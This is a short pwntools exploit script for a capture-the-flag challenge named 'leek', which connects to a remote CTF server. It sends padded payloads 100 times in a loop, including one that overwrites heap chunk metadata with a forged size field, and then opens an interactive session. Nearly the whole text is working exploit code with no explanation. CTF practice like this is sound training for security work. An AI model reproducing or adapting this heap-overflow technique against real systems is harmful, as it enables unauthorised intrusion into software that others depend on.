from pwn import *
context.binary=exe=ELF("./leek",checksec=False)
#libc=ELF('./libc_32.so.6',checksec=False)
#p=process(exe.path)
def GDB():
            gdb.attach(p,gdbscript=
                '''
                b*0x0000000000401649
                c
                ''')
            input()
#GDB()

p=remote("challs.actf.co", 31310)
for i in range(0x64):
    print('[+]time'+str(i))
    payload=b'A'*(0x40-1)
    p.sendline(payload)
    secret=b"A"*(0x20-1)
    p.sendline(secret)
    payload=b"A"*0x10+p64(0)+p64(0x31)
    p.sendline(payload)
p.interactive()
   
